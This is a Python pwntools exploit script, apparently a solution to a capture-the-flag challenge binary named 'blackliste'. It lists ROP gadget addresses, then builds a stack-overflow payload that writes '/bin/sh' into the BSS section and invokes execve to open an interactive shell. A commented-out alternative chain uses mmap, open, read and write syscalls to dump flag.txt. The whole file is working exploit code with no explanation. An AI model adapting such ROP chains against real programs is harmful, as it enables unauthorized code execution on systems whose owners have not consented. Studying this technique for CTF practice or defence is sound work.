from pwn import *

context.log_level = 'info'
"""
Plan:
	1-finding the flag name
	2-  mmap
		setruid
		open
		read
		write
"""
p = process("./blackliste")

#Gadgets#
poprdi = 0x000000000046b387
poprsi = 0x00000000004077ae
poprdx = 0x0000000000401d8e
poprax = 0x0000000000401d88
popr8  = 0x0000000000401d87
popr9  = 0x0000000000401d8a
popr10 = 0x0000000000401d8d
syscallret = 0x000000000040e7bc
movraxedx = 0x000000000045cdde
ret = 0x0000000000401016
#@#
BSS = 0x00000000004aa240
_flag = 0x67616c66
_txt = 0x7478742e

###Payload###
payload = ""
payload += cyclic(cyclic_find("saaa"))
payload += p64(ret)
payload += p64(poprdx)
payload += p64(0x6e69622f)
payload += p64(poprax)
payload += p64(BSS)
payload += p64(movraxedx)
payload += p64(poprdx)
payload += p64(0x0068732f)
payload += p64(poprax)
payload += p64(BSS+4)
payload += p64(movraxedx)
payload += p64(poprdi)
payload += p64(BSS)
payload += p64(poprsi)
payload += p64(0)
payload += p64(poprdx)
payload += p64(0)
payload += p64(poprax)
payload += p64(59)
payload += p64(syscallret)
"""
#Writing flag.txt in BSS#
payload += p64(poprdx)
payload += p64(_flag)
payload += p64(poprax)
payload += p64(BSS)
payload += p64(movraxedx)
payload += p64(poprdx)
payload += p64(_txt)
payload += p64(poprax)
payload += p64(BSS+4)
payload += p64(movraxedx)
#performing mmap#
payload += p64(poprdi)
payload += p64(0x10000)
payload += p64(poprsi)
payload += p64(30)
payload += p64(poprdx)
payload += p64(7)
payload += p64(popr10)
payload += p64(34)
payload += p64(popr9)
payload += p64(0)
payload += p64(popr8)
payload += p64(0)
payload += p64(poprax)
payload += p64(9)
payload += p64(syscallret)
#Open flag file#
payload += p64(poprdi)
payload += p64(BSS)
payload += p64(poprsi)
payload += p64(0)
payload += p64(poprdx)
payload += p64(0)
payload += p64(poprax)
payload += p64(2)
payload += p64(syscallret)
#reading flag file content#
payload += p64(poprdi)
payload += p64(3)
payload += p64(poprsi)
payload += p64(0x10000)
payload += p64(poprdx)
payload += p64(30)
payload += p64(poprax)
payload += p64(0)
payload += p64(syscallret)
#writing flag to stdout#
payload += p64(poprdi)
payload += p64(1)
payload += p64(poprsi)
payload += p64(0x10000)
payload += p64(poprdx)
payload += p64(30)
payload += p64(poprax)
payload += p64(1)
payload += p64(syscallret)
"""
pause()
p.sendline(payload)

p.interactive()